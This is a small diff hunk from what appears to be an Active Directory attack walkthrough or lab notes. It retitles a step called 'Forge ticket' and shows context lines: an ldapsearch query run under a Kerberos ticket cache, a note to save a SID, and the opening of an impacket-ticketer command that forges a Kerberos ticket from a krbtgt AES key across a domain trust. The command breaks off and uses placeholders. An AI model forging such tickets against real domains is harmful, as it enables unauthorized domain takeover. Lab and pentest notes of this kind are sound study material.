@@ -525,7 +525,7 @@ KRB5CCNAME=/tmp/krb5cc_celia LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI \
 
 Decode → SID ending `-1603`. ⚠ save it.
 
-4.12 — forge ticket (Kali T1) — ⚠ your aes key, source SID, crossing SID:
+### Forge ticket (Kali T1) — ⚠ your aes key, source SID, crossing SID:
 
 ```bash
 impacket-ticketer -aesKey <KRBTGT_AES256> \
